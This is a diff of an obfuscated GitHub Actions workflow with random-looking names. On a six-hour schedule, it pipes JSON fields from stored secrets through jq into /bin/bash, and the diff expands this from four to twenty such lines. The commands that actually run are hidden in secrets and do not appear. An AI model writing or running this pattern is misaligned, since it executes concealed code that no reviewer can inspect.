@@ -3,7 +3,7 @@ name: caochenxi8710
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 4/6 * * *'
+    - cron: '10 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +11,26 @@ jobs:
       - uses: actions/checkout@v4
       - name: caochenxi8710
         env:
-          gpax3700: ${{ secrets.gpax3700 }}
+          ayip6: ${{ secrets.ayip6 }}
         run: |
-          echo $gpax3700 | jq -r .vo2231 | /bin/bash
-          echo $ut2 | jq -r .frlty235 | /bin/bash
-          echo $fa11158 | jq -r .yow6171 | /bin/bash
-          echo $mznhm3593 | jq -r .tf97 | /bin/bash
+          echo $ayip6 | jq -r .b42 | /bin/bash
+          echo $z9571 | jq -r .azpmz9495 | /bin/bash
+          echo $dfsno6 | jq -r .ep2 | /bin/bash
+          echo $yc730 | jq -r .je7 | /bin/bash
+          echo $ie6 | jq -r .ysz8 | /bin/bash
+          echo $qhv76304 | jq -r .u705 | /bin/bash
+          echo $d4560 | jq -r .qywjn40 | /bin/bash
+          echo $q683 | jq -r .wfjyi79385 | /bin/bash
+          echo $eaqay82722 | jq -r .b7 | /bin/bash
+          echo $y6780 | jq -r .pzipu32848 | /bin/bash
+          echo $t232 | jq -r .uc165 | /bin/bash
+          echo $ue1 | jq -r .ll33 | /bin/bash
+          echo $i342 | jq -r .moe5829 | /bin/bash
+          echo $lickm2584 | jq -r .liii6214 | /bin/bash
+          echo $fmr02251 | jq -r .ux442 | /bin/bash
+          echo $dw27 | jq -r .rnbvy5091 | /bin/bash
+          echo $mlpnb2 | jq -r .zwhf9 | /bin/bash
+          echo $kd25427 | jq -r .airfb99010 | /bin/bash
+          echo $ciprj0 | jq -r .wgxyj263 | /bin/bash
+          echo $m12 | jq -r .rxi16848 | /bin/bash
 
